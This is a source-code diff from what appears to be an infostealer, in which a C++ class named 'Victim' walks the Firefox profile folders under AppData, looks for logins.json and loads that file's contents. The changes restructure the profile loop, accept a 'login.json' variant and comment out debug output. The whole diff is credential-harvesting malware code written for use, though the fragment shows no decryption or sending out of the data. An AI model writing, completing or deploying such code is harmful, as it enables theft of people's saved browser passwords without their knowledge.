@@ -11,37 +11,31 @@ bool Victim::GetFirefoxProfiles() {
 	bool containLogins = false;
 	//Loop into profiles, for each profiles, call GetProfileContent. This function will Loop in every file/folder in the Firefox AppData Directory
 	//C:\Users\{Username}\AppData\Roaming\Mozilla\Firefox\Profiles
+	int iterator = 0;
 	try {
 		this->FirefoxProfileList = this->GetFirefoxProfilesList(this->p_FirefoxAppData);
-		for (int i = 0; i < this->FirefoxProfileList.size(); i++) {
-			this->FirefoxProfileList[i] = this->GetProfileContent(this->FirefoxProfileList[i]);
-			for (std::wstring const& fileList : this->FirefoxProfileList[i].ProfileFiles) {
+		for (Profile firefoxProfile : this->FirefoxProfileList) {
+			std::wcout << L"[+] WORKING WITH " << firefoxProfile.profilePath << std::endl;
+			firefoxProfile = this->GetProfileContent(firefoxProfile);
+			containLogins = false; //Set containLogins to false at the beginning of each loop
+			for (std::wstring const& fileList : firefoxProfile.ProfileFiles) {
 				//Check File Extensions **Not needed for now so commenting out**
-				dotIterator = fileList.rfind('.', fileList.length());
-				if (dotIterator != std::string::npos) {
+				//dotIterator = fileList.rfind('.', fileList.length());
+				//if (dotIterator != std::string::npos) {
 					//std::wstring extension = fileList.substr(dotIterator + 1, fileList.length() - dotIterator);
-					if (fileList == L"logins.json") {
-						//everything good
-						containLogins = true;
-					}
+				if (fileList == L"logins.json" || fileList == L"login.json") {
+					//everything good
+#ifdef _DEBUG
+					std::wcout<<L"[+] Login Profile Found : "<<firefoxProfile.profileName+L"\\logins.json..."<<std::endl;
+					std::wcout << L"[+] Getting File Content of : "<<firefoxProfile.profileName+L"\\logins.json..."<<std::endl;
+#endif
+					firefoxProfile.LoginsFileContent = this->GetProfileLoginsContent(firefoxProfile);
+					containLogins = true;
 				}
 			}
-			if (!containLogins) {
-#ifdef _DEBUG
-				std::wcout << L"Erasing profile : " << this->FirefoxProfileList[i].profileName << std::endl;
-				std::wcout << L"Reason : DOES NOT CONTAIN ANY LOGINS INFORMATIONS" << std::endl;
-#endif
-				this->FirefoxProfileList.erase(this->FirefoxProfileList.begin() + i);
-			}
+			iterator++;
 		}
-			for (int i = 0; i < this->FirefoxProfileList.size(); i++) {
-#ifdef _DEBUG
-				std::wcout << "Getting File Content of : " << this->FirefoxProfileList[i].profileName + L"\\logins.json" << std::endl;
-#endif
-				this->FirefoxProfileList[i].LoginsFileContent = this->GetProfileLoginsContent(this->FirefoxProfileList[i]);
-
-			}
-		}
+	}
 	catch (std::logic_error& e) {
 #ifdef _DEBUG
 		std::wcout << "LOGIC_ERROR : " << e.what() << std::endl;
@@ -104,7 +98,7 @@ std::vector<Profile> Browsers::GetFirefoxProfilesList(const std::wstring& p_fire
 						delete dummyProfile;
 						//dirs.directories.push_back(p_FirefoxAppData + L"\\" + ffd.cFileName);
 #ifdef _DEBUG
-						std::wcout << p_firefox << L"\\" << ffd.cFileName << std::endl;
+						//std::wcout << p_firefox << L"\\" << ffd.cFileName << std::endl;
 #endif
 					}
 				}
@@ -139,12 +133,14 @@ Profile Browsers::GetProfileContent(Profile firefoxProfiles) {
 						//If file is a directory add it to the directories param
 						firefoxProfiles.ProfileDirectories.push_back((wchar_t*)ffd.cFileName);
 #ifdef _DEBUG
-						std::wcout << L"PATH : " << ffd.cFileName << std::endl;
+						//Not needed for now so commenting out
+						//std::wcout << L"PATH : " << ffd.cFileName << std::endl;
 #endif
 					}
 					else {
 #ifdef _DEBUG
-						std::wcout << L"FILE : " << ffd.cFileName << std::endl;
+						//Not needed for now so commenting out
+						//std::wcout << L"FILE : " << ffd.cFileName << std::endl;
 #endif
 						firefoxProfiles.ProfileFiles.push_back(ffd.cFileName);
 					}
